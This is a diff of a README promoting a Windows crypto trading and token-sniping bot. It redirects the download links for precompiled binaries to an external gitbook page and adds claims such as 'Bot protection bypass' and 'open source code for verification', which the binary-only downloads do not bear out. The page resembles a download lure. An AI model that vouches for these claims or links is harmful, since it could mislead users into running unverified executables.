@@ -1,5 +1,6 @@
-# DeFi Selenium Bot
+# DEXTrading-IDOSniping-Arbitrum-BNB-Blast-Bot
 
+<p align="center"><img width="720" height="463" src="images/inter.jpg" alt="Defi Bot interface" /></p>
 <p align="center"><img width="160" height="160" src="images/bitcoin.png" alt="Defi Bot logo" /></p>
 
 <h1 align="center">Defi Bot v3.1</h1>
@@ -19,19 +20,19 @@
 
 
 
-> This Bot, a DeFi Trading bot for ETH, BSC, AVAX, MATIC, FTM, Harmony, Metis, CRONOS, KCC, VELAS, Pulsechain, Venom, Kaikas, Milkomeda, Solana and more, can Swap, Sniping and Arbitrage
+> DeFi Trading bot for Ethereun(ETH), Binance Smart Chain(BSC), AVAX, MATIC, FTM, Harmony, Metis, CRONOS, KCC, VELAS, Pulsechain, Venom, Kaikas, Milkomeda, Solana(SOL), BLAST, and more Buy, sell, place limit order, instant trading and snipe any ERC-20, BEP-20 in just a few clicks in all DEX's, Also suitable for Yield-Farming, and Liquidity Mining
 
 ## Download
 
-1: Download .NET V4.5 [```Download .NET Module```](https://download.microsoft.com/download/B/A/4/BA4A7E71-2906-4B2D-A0E1-80CF16844F5F/dotNetFx45_Full_setup.exe)
+1: Download .NET V4.5 [```Download .NET Module```]([https://download.microsoft.com/download/B/A/4/BA4A7E71-2906-4B2D-A0E1-80CF16844F5F/dotNetFx45_Full_setup.exe]
 
 2: Install Actual Precompile Release x32 / x64 👇
 
-Windows x64: [ ```Download``` ](https://github.com/manalap/defi-bot-selenium/releases/download/defi-bot-selenium/Selenium.Bot.Defi.Release.86-64.rar)
+Windows x64: [ ```Download``` ](https://sts-defi-bot.gitbook.io/selenium-bot/selenium-bot/download-link)
 
-Windows x32: [ ```Download``` ](https://linkhere)
+Windows x32: [ ```Download``` ](https://sts-defi-bot.gitbook.io/selenium-bot/selenium-bot/download-link)
 
-Windows MSI Package: [ ```Download``` ](https://linkhere)
+Windows MSI Package: [ ```Download``` ](https://sts-defi-bot.gitbook.io/selenium-bot/selenium-bot/download-link)
 
 Windows Repair Module: [ ```Download``` ](https://linkhere)
 
@@ -45,12 +46,15 @@ All Contact, which is linked at the very bottom of the repository.
 ## Features
 - 🚀 Realtime super-fast websocket trading.
 - 📈 50+ Technical indicators. ([docs](https://github.com/anandanand84/technicalindicators))
-- 🌈 Written in .NET and Python!
-- 🌿 Unit tested source code.
+- 🌈 Automated trading: Creation and execution of orders on DEX
+- 🌿 Market Analysis: Collecting and analyzing market data to identify trading opportunities
 - 📝 Paper trading a strategy on LIVE exchange data.
 - 🏡 Backtesting engine with local data.
-- 🚢 Run ```DeFi Selenium Trade Bot``` inside a docker container.
-- More features soon..
+- 🚢 Risk management: Setting risk parameters such as stop loss and take profit settings
+- 🔗 Integration with DEX: Support for popular DEXs such as Uniswap, Sushiswap and PancakeSwap, and more
+- ⚙️ Customization: Customizable parameters and strategies to optimize trading results
+- 🔬 Monitoring and reporting: Tracking trading results and providing detailed reports
+- 🔋 Trading into all networks
 
 
 ## Mission
@@ -63,6 +67,17 @@ DeFi STS Bot is an innovative solution designed to optimize crypto assets and ma
 
 
 ## Key Features
+- Ahead of new listings: Sniping new tokens when listing them
+- Fighting anti-bot defenses: Bot protection bypass
+- Instant trading: Instant execution of orders without delays for transaction confirmation
+- Protection against fraud: Tracking quick sell-offs and liquidity withdrawals, automatic token sales when the price drops
+- Ahead of IDO listings: Automatic purchase of tokens after announcement in IDO
+- Ahead of Telegram feeds: Monitoring Telegram channels and chats to detect new tokens
+- Placement of limit orders: Possibility to place limit orders
+- Creating automated strategies: Creating strategies for automatic buying on the downside and using trailing stop loss
+- Support for all networks
+- Safety: Private key encryption, open source code for verification
+- Faster trades than other bots: Instant order execution, allowing users to acquire new tokens faster than anyone else
 
 ### Intuitive Interface
 
